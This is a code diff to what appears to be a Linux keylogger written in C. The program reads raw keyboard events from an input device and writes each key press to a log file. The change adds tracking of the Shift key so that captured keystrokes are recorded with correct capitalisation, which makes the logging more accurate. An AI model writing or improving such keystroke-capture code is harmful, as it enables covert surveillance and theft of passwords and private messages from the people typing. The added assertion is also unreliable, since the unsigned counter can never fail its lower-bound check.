@@ -13,6 +13,9 @@
 #include "options.h"
 #include "config.h"
 
+#define KEY_RELEASE 0
+#define KEY_PRESS 1
+
 typedef struct input_event input_event;
 
 static void rootCheck();
@@ -69,17 +72,26 @@ int main(int argc, char **argv) {
       exit(-1);
    }
 
+   uint8_t shift_pressed = 0;
    input_event event;
    while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
       if (event.type == EV_KEY) {
-         if (event.value == 1) { // Key press
-            char *name = getKeyText(event.code);
+         if (event.value == KEY_PRESS) {
+            if (isShift(event.code)) {
+               shift_pressed++;
+            }
+            char *name = getKeyText(event.code, shift_pressed);
             if (strcmp(name, UNKNOWN_KEY) != 0) {
                LOG("%s", name);
                fputs(name, logfile);
             }
+         } else if (event.value == KEY_RELEASE) {
+            if (isShift(event.code)) {
+               shift_pressed--;
+            }
          }
       }
+      assert(shift_pressed >= 0 && shift_pressed <= 2);
    }
 
    Config_cleanup(&config);
